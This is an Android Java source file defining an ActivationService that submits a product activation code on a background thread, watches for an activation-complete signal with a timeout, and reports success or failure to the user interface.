package com.fx;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.os.Binder;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import com.fx.activation.ActivationHelper;
import com.fx.activation.ActivationManager;
import com.fx.activation.Response;
import com.fx.maind.ref.Customization;
import com.fx.preference.ConnectionHistoryManager;
import com.fx.preference.ConnectionHistoryManagerFactory;
import com.fx.util.FxResource;
import com.vvt.logger.FxLog;
import com.vvt.timer.TimerBase;

public class ActivationService extends Service {
	
	public static final String EXTRA_ACTIVATION_CODE = "mbackup_extra_activation_code";
	
	private static final String TAG = "ActivationService";
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	
	private boolean mIsRunning = false;
	
	private ContentObserver mActivationCompleteObserver;
	private Handler mHandler;
	private IBinder mBinder = new LocalBinder();
	private TimerBase mProcessingTimeout;
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// flags: 0=Default, 1=START_FLAG_REDELIVERY, 2=START_FLAG_RETRY
		if (intent != null) {
			RunningThread t = new RunningThread(intent);
			t.start();
		}
		return START_NOT_STICKY;
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		return mBinder;
	}
	
	public void setHandler(Handler handler) {
		mHandler = handler;
	}
	
	public boolean isRunning() {
		return mIsRunning;
	}

	public class LocalBinder extends Binder {
		public ActivationService getService() {
			return ActivationService.this;
		}
	}
	
	class RunningThread extends Thread {
		Intent mIntent;
		
		public RunningThread(Intent intent) {
			mIntent = intent;
		}
		
		@Override
		public void run() {
			if (LOGV) FxLog.v(TAG, "Start activation");
			
			mIsRunning = true;
			
			Looper.prepare();
			
			if (LOGV) FxLog.v(TAG, "Listen to activation complete notification");
			registerActivationCompleteObserver();
			
			final Context context = getApplicationContext();
			
			String activationCode = mIntent.getStringExtra(EXTRA_ACTIVATION_CODE);
			ActivationManager am = ActivationManager.getInstance(context);
			am.activateProduct(activationCode);
			
			if (LOGV) FxLog.v(TAG, "Waiting for response ...");
			
			Looper.loop();
		}
	}
	
	private void setState(boolean isStart) {
		if (isStart) {
			if (LOGV) FxLog.v(TAG, "Service is started ...");
			mIsRunning = true;
		}
		else {
			if (LOGV) FxLog.v(TAG, "Service is stopped ...");
			mIsRunning = false;
			
			if (mActivationCompleteObserver != null) {
				getContentResolver().unregisterContentObserver(mActivationCompleteObserver);
				mActivationCompleteObserver = null;
			}
			
			if (Looper.myLooper() != null) {
				Looper.myLooper().quit();
			}
		}
	}

	private void resetProcessingTimeout() {
		if (mProcessingTimeout != null) {
			mProcessingTimeout.stop();
			mProcessingTimeout = null;
		}
		
		mProcessingTimeout = new TimerBase() {
			@Override
			public void onTimer() {
				if (LOGV) FxLog.v(TAG, "Time Out!!");
				setState(false);
			}
		};
		
		mProcessingTimeout.setTimerDurationMs(
				UiHelper.PROGRESS_DIALOG_TIMEOUT_LONG_MS);
		
		mProcessingTimeout.start();
	}

	private void registerActivationCompleteObserver() {
		mActivationCompleteObserver = new ContentObserver(new Handler()) {
			@Override
			public void onChange(boolean selfChange) {
				if (LOGV) FxLog.v(TAG, "Activation completed!");
				UiHelper.dismissProgressDialog(mHandler);
				UiHelper.resetView(mHandler);
				onActivationComplete();
				setState(false);
			}
		};
		
		getContentResolver().registerContentObserver(
				ActivationHelper.URI_ACTIVATION_SUCCESS, false, mActivationCompleteObserver);
		
		resetProcessingTimeout();
	}

	private void onActivationComplete() {
		if (LOGV) FxLog.v(TAG, "onActivationComplete # ENTER ...");
		
		String responseMsg = null;
		
		ConnectionHistoryManager connectionHistoryManager = 
			ConnectionHistoryManagerFactory.getInstance(getApplicationContext());
		
		Response response = connectionHistoryManager.getActivationResponse();
				
		if (LOGV) FxLog.v(TAG, String.format("onActivationComplete # response: %s", response));

		if (response != null) {
			if (response.isActivateAction()) {
				if (response.isSuccess()) {
					responseMsg = FxResource.LANGUAGE_ACTIVATION_SUCCESS;
				} 
				else {
					String message = String.format("%s: %s", 
							FxResource.LANGUAGE_ACTIVATION_FAILED, 
							response.getMessage());
					responseMsg = message;
				}
			}
		} 
		else {
			if (LOGV) FxLog.v(TAG, "Invalid activation state.");
		}
		
		UiHelper.sendNotify(mHandler, responseMsg);
		
		if (LOGV) FxLog.v(TAG, "onActivationComplete # EXIT ...");
	}
}
